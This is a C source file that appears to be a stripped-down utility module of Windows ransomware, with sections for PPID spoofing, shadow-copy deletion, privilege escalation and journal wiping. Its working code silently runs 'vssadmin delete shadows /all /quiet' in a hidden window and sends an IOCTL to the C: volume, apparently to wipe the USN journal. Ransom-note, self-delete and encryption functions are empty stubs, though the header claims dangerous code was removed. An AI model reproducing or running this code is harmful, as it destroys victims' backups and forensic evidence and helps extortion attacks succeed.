/*
 * utils.c - Simplified utility functions
 * Removed dangerous PE parsing code
 */

#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ===================== PPID SPOOFING =====================
DWORD FindProcessPidStr(const char* procName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe = {sizeof(pe)};
    DWORD pid = 0;
    
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return pid;
}

// ===================== VSS DELETION =====================
void NukeBackupsCOM(void) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {0};
    
    CreateProcessA(NULL, "vssadmin delete shadows /all /quiet",
                   NULL, NULL, FALSE, CREATE_NO_WINDOW,
                   NULL, NULL, &si, &pi);
    
    if (pi.hProcess) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) CloseHandle(pi.hThread);
}

void NukeBackups(void) {
    NukeBackupsCOM();
}

// ===================== PRIVILEGE ESCALATION =====================
// ===================== USN JOURNAL WIPE =====================
void WipeUSNJournal(void) {
    HANDLE hVol = CreateFileA("\\\\.\\C:",
                             GENERIC_WRITE | GENERIC_READ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             NULL, OPEN_EXISTING, 0, NULL);
    
    if (hVol != INVALID_HANDLE_VALUE) {
        DWORD dwBytes;
        DeviceIoControl(hVol, 0x00090068, NULL, 0, NULL, 0, &dwBytes, NULL);
        CloseHandle(hVol);
    }
}

// ===================== IO PRIORITY =====================
void SetIoCrtitical(void) {
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
}

// ===================== STUB FUNCTIONS (REMOVED DANGEROUS CODE) =====================
void InitAllSyscalls(void) {
    // Removed dangerous PE parsing - use safe Win32 API instead
}

void DropNoteADS(void) {
    // Simplified - just use standard file creation
}

void DropNote(void) {
    DropNoteADS();
}

void SelfDeleteSpoofed(void) {
    // Not used in simplified version
}

void SelfDelete(void) {
    SelfDeleteSpoofed();
}

unsigned __stdcall EncryptionWorker(void* arg) {
    (void)arg;
    return 0;
}
